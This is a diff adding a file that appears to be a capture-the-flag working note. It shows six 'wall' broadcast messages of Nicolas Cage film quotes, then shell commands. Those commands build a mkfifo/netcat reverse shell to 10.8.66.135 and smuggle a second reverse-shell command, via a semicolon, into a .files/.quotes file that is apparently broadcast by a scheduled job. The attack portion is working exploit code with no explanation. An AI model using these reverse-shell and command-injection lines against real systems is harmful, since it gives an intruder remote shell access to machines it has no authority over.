@@ -1,0 +1,48 @@
+Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
+
+1)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:03:01 
+                                                                               
+Black, French, alcoholic priest, kind of a ****. Why, do you know him? — 
+Ghost Rider: Spirit of Vengeance
+
+2)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:06:01 
+                                                                               
+Only if it's a noun, and the words have equal weight. Like, Homeland Security.
+If it's a participle modifying the first word, then... you better 
+keep it lower case. — Seeking Justice
+
+3)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:09:01 
+                                                                               
+What's in the bag? A shark or something? — The Wicker Man
+
+4)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:12:02 
+                                                                               
+Did I ever tell ya that this here jacket represents a symbol of my 
+individuality, and my belief in personal freedom? — Wild at Heart
+
+5)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:15:01 
+                                                                               
+Release the baby! — The Croods
+
+6)
+Broadcast message from cage@national-treasure (somewhere) (Sun Apr 10 14:18:01 
+                                                                               
+Sorry boss, but there's only two men I trust. One of them's me. 
+The other's not you. — Con Air
+
+
+
+rm -f /tmp/rev
+cat << EOF > /tmp/rev
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.66.135 4444 >/tmp/f
+EOF
+chmod +x /tmp/rev
+printf 'revshell time; /tmp/rev\n' > .files/.quotes
+
+echo "lol;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.66.135 9001 >/tmp/f" > .files/.quotes 
